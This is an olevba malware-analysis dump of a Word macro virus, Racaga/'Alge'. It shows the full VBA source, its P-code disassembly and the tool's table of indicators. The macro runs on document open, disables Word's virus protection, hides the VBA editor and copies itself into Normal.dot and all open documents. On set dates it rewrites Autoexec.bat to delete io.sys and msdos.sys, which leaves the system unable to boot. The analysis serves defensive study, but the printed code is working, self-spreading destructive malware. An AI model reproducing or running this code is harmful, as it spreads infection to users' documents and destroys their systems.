olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Racaga
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Racaga - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Rem barok Alge <There is no way/reasons to hide>
Rem Alge approximate consist of 150 lines.
Rem Rundate: June 05,2003 Cbrhck /CARAGA, Philippines

Option Compare Text
Private Sub Document_Open()
On Error Resume Next
WordBasic.disableautomacros False
ALGE = Options.DefaultFilePath(wdStartupPath)
ImportAlge = ALGE & "\Alge.txt"
With Dialogs(wdDialogFileSummaryInfo)
    .Title = "Alge"
    .Subject = "Luceat Lux Vistra"
    .Author = "Cbrhck"
    .Keywords = "brk"
    .Comments = "RM Diega, I DO LOVE YOU, very much... -TAKE A BUNCH OF CARE- honey!"
    .Execute
End With
    Options.ConfirmConversions = True
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
With CommandBars("Tools")
    .Reset
    .Controls("Macro").Reset
    .Controls("Templates and Add-Ins...").Reset
    .Controls("Customize...").Reset
End With
    For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
    CurrObject = NormalTemplate.VBProject.VBComponents(i).Name
        If (CurrObject <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=CurrObject, Object:=wdOrganizerObjectProjectItems
    Next i
    For Each OpenDoc In Documents
With OpenDoc
    For j = OpenDoc.VBProject.VBComponents.Count To 1 Step -1
    CurrObject = OpenDoc.VBProject.VBComponents(j).Name
        If (CurrObject <> "ThisDocument") And (CurrObject <> "Reference to Normal") Then Application.OrganizerDelete Source:=OpenDoc.FullName, Name:=CurrObject, Object:=wdOrganizerObjectProjectItems
Next j
End With
    Next OpenDoc
        Application.ShowVisualBasicEditor = False
        Application.DisplayAlerts = wdAlertsNone
        ActiveDocument.ReadOnlyRecommended = False
    WordBasic.disableautomacros
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Delete
    CommandBars("Control Toolbox").Visible = False
    CommandBars("Control Toolbox").Enabled = False
        CustomizationContext = NormalTemplate
            FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
            FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    ALGE = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 150)
        If Dir(ImportAlge) = True Then Kill ImportAlge
    Open ImportAlge For Output Shared As #1
        Print #1, ALGE
        Close #1
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Find("Alge", 1, 1, 10, 10) = False Then
numberoflines = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, numberoflines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ImportAlge
NormalTemplate.Save
End If
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Find("Alge", 1, 1, 10, 10) = False Then
numberoflines = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, numberoflines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ImportAlge
ActiveDocument.Save
End If
Kill ImportAlge
get2ImplementBatch
End Sub

Private Sub get2ImplementBatch()
Dim freeF As Integer
On Error Resume Next
If (Day(Date) = 15) Or (Day(Date) = 30) Then
Call SetAttr("C:\Autoexec.bat", vbArchive)
freeF = FreeFile
Kill "C:\Autoexec.bat"
Open "C:\Autoexec.bat" For Output As #freeF
Print #freeF, "@Echo Off"
Print #freeF, "Echo Off"
Print #freeF, "Rem barok(Alge) Batch Dummy Implementation"
Print #freeF, "Rem  by: Cbrhck /CARAGA /Philippines"
Print #freeF, ""
Print #freeF, "cls"
Print #freeF, "If Exist C:\Command.Com goto Begin"
Print #freeF, ":Begin"
Print #freeF, "Rem =Alge -cracking your system."
Print #freeF, ""
Print #freeF, "Verify = On"
Print #freeF, "Break = Off"
Print #freeF, "  Set Path=C:\%Path;%1%2%3%4%5"
Print #freeF, "C:\windows\command\attrib c:\io.sys -a -s -h -r"
Print #freeF, "c:\windows\command\attrib c:\msdos.sys -a -s -h -r"
Print #freeF, "del C:\io.sys"
Print #freeF, "de C:\msdos.sys"
Print #freeF, "If Exist C:\Windows\Rundll.exe Copy C:\Windows\Rundll.exe C:\msdos.sys >nul"
Print #freeF, "If Exist C:\Windows\Rundll32.exe Copy C:\Windows\Rundll32.exe C:\io.sys >nul"
Print #freeF, ""
Print #freeF, "cls"
Print #freeF, "echo."
Print #freeF, "echo Alge by: Cbrhck - CARAGA <Luceat Lux Vistra>"
Print #freeF, "echo."
Print #freeF, "echo I'm not really interested to make ""DUMBASS"" your Machine but I shall."
Print #freeF, "echo."
Print #freeF, "echo -->>I miss you so much Jonalyn V. of AP. Butuan City, Philippines"
Print #freeF, "echo."
Print #freeF, "echo -->> I LOVE YOU VERY MUCH!, Take a bunch of Care!! "
Print #freeF, "echo."
Print #freeF, "echo."
Print #freeF, "echo."
Print #freeF, "echo More thanks to myself... my developer's world who really SUCK-UP! your fuck'n did."
Print #freeF, "pause"
Close #freeF
End If
End Sub

Private Sub Document_Close()
Dim CurrDoc
On Error Resume Next
CurrDoc = ActiveDocument.FullName
If CurrDoc.Undo = False And CurrDoc.Redo = False Then
ExitActiveDocument.Close
End If
WordBasic.disableautomacros True
End Sub



















-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Racaga
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 9507 bytes
' Line #0:
' Line #1:
' Line #2:
' 	Rem 0x002D " barok Alge <There is no way/reasons to hide>"
' Line #3:
' 	Rem 0x0027 " Alge approximate consist of 150 lines."
' Line #4:
' 	Rem 0x0032 " Rundate: June 05,2003 Cbrhck /CARAGA, Philippines"
' Line #5:
' Line #6:
' 	Option  (Compare Text)
' Line #7:
' 	FuncDefn (Private Sub Document_Open())
' Line #8:
' 	OnError (Resume Next) 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0001 
' Line #10:
' 	Ld wdStartupPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St ALGE 
' Line #11:
' 	Ld ALGE 
' 	LitStr 0x0009 "\Alge.txt"
' 	Concat 
' 	St ImportAlge 
' Line #12:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #13:
' 	LitStr 0x0004 "Alge"
' 	MemStWith Title 
' Line #14:
' 	LitStr 0x0011 "Luceat Lux Vistra"
' 	MemStWith Subject 
' Line #15:
' 	LitStr 0x0006 "Cbrhck"
' 	MemStWith Author 
' Line #16:
' 	LitStr 0x0003 "brk"
' 	MemStWith Keywords 
' Line #17:
' 	LitStr 0x0043 "RM Diega, I DO LOVE YOU, very much... -TAKE A BUNCH OF CARE- honey!"
' 	MemStWith Comments 
' Line #18:
' 	ArgsMemCallWith Execute 0x0000 
' Line #19:
' 	EndWith 
' Line #20:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #23:
' 	StartWithExpr 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	With 
' Line #24:
' 	ArgsMemCallWith Reset 0x0000 
' Line #25:
' 	LitStr 0x0005 "Macro"
' 	ArgsMemLdWith Controls 0x0001 
' 	ArgsMemCall Reset 0x0000 
' Line #26:
' 	LitStr 0x0018 "Templates and Add-Ins..."
' 	ArgsMemLdWith Controls 0x0001 
' 	ArgsMemCall Reset 0x0000 
' Line #27:
' 	LitStr 0x000C "Customize..."
' 	ArgsMemLdWith Controls 0x0001 
' 	ArgsMemCall Reset 0x0000 
' Line #28:
' 	EndWith 
' Line #29:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #30:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St CurrObject 
' Line #31:
' 	Ld CurrObject 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld CurrObject 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #32:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	StartForVariable 
' 	Ld OpenDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #34:
' 	StartWithExpr 
' 	Ld OpenDoc 
' 	With 
' Line #35:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	Ld OpenDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #36:
' 	Ld j 
' 	Ld OpenDoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St CurrObject 
' Line #37:
' 	Ld CurrObject 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	Ld CurrObject 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld OpenDoc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld CurrObject 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #38:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' 	EndWith 
' Line #40:
' 	StartForVariable 
' 	Ld OpenDoc 
' 	EndForVariable 
' 	NextVar 
' Line #41:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #42:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #43:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #44:
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0000 
' Line #45:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #46:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #47:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #48:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #49:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #50:
' 	LitVarSpecial (False)
' 	LitStr 0x000F "Control Toolbox"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #51:
' 	LitVarSpecial (False)
' 	LitStr 0x000F "Control Toolbox"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #52:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #53:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #54:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #55:
' 	LitDI2 0x0001 
' 	LitDI2 0x0096 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St ALGE 
' Line #56:
' 	Ld ImportAlge 
' 	ArgsLd Dir 0x0001 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ImportAlge 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #57:
' 	Ld ImportAlge 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output Shared)
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld ALGE 
' 	PrintItemNL 
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #60:
' 	LitStr 0x0004 "Alge"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	LitDI2 0x000A 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #61:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St numberoflines 
' Line #62:
' 	LitDI2 0x0001 
' 	Ld numberoflines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #63:
' 	Ld ImportAlge 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #64:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	LitStr 0x0004 "Alge"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	LitDI2 0x000A 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #67:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St numberoflines 
' Line #68:
' 	LitDI2 0x0001 
' 	Ld numberoflines 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #69:
' 	Ld ImportAlge 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #70:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	Ld ImportAlge 
' 	ArgsCall Kill 0x0001 
' Line #73:
' 	ArgsCall get2ImplementBatch 0x0000 
' Line #74:
' 	EndSub 
' Line #75:
' Line #76:
' 	FuncDefn (Private Sub get2ImplementBatch())
' Line #77:
' 	Dim 
' 	VarDefn freeF (As Integer)
' Line #78:
' 	OnError (Resume Next) 
' Line #79:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001E 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #80:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	Ld vbArchive 
' 	ArgsCall (Call) SetAttr 0x0002 
' Line #81:
' 	Ld Friend 
' 	St freeF 
' Line #82:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	ArgsCall Kill 0x0001 
' Line #83:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	Ld freeF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #84:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@Echo Off"
' 	PrintItemNL 
' Line #85:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "Echo Off"
' 	PrintItemNL 
' Line #86:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002A "Rem barok(Alge) Batch Dummy Implementation"
' 	PrintItemNL 
' Line #87:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "Rem  by: Cbrhck /CARAGA /Philippines"
' 	PrintItemNL 
' Line #88:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #89:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cls"
' 	PrintItemNL 
' Line #90:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "If Exist C:\Command.Com goto Begin"
' 	PrintItemNL 
' Line #91:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 ":Begin"
' 	PrintItemNL 
' Line #92:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "Rem =Alge -cracking your system."
' 	PrintItemNL 
' Line #93:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #94:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Verify = On"
' 	PrintItemNL 
' Line #95:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Break = Off"
' 	PrintItemNL 
' Line #96:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "  Set Path=C:\%Path;%1%2%3%4%5"
' 	PrintItemNL 
' Line #97:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002F "C:\windows\command\attrib c:\io.sys -a -s -h -r"
' 	PrintItemNL 
' Line #98:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "c:\windows\command\attrib c:\msdos.sys -a -s -h -r"
' 	PrintItemNL 
' Line #99:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "del C:\io.sys"
' 	PrintItemNL 
' Line #100:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "de C:\msdos.sys"
' 	PrintItemNL 
' Line #101:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004B "If Exist C:\Windows\Rundll.exe Copy C:\Windows\Rundll.exe C:\msdos.sys >nul"
' 	PrintItemNL 
' Line #102:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004C "If Exist C:\Windows\Rundll32.exe Copy C:\Windows\Rundll32.exe C:\io.sys >nul"
' 	PrintItemNL 
' Line #103:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #104:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cls"
' 	PrintItemNL 
' Line #105:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #106:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0031 "echo Alge by: Cbrhck - CARAGA <Luceat Lux Vistra>"
' 	PrintItemNL 
' Line #107:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #108:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004A "echo I'm not really interested to make "DUMBASS" your Machine but I shall."
' 	PrintItemNL 
' Line #109:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #110:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0046 "echo -->>I miss you so much Jonalyn V. of AP. Butuan City, Philippines"
' 	PrintItemNL 
' Line #111:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #112:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0038 "echo -->> I LOVE YOU VERY MUCH!, Take a bunch of Care!! "
' 	PrintItemNL 
' Line #113:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #114:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #115:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #116:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0057 "echo More thanks to myself... my developer's world who really SUCK-UP! your fuck'n did."
' 	PrintItemNL 
' Line #117:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "pause"
' 	PrintItemNL 
' Line #118:
' 	Ld freeF 
' 	Sharp 
' 	Close 0x0001 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	EndSub 
' Line #121:
' Line #122:
' 	FuncDefn (Private Sub Document_Close())
' Line #123:
' 	Dim 
' 	VarDefn CurrDoc
' Line #124:
' 	OnError (Resume Next) 
' Line #125:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St CurrDoc 
' Line #126:
' 	Ld CurrDoc 
' 	MemLd Undo 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld CurrDoc 
' 	MemLd Redo 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #127:
' 	Ld ExitActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #128:
' 	EndIfBlock 
' Line #129:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0001 
' Line #130:
' 	EndSub 
' Line #131:
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |Rundll.exe          |Executable file name                         |
|IOC       |Rundll32.exe        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

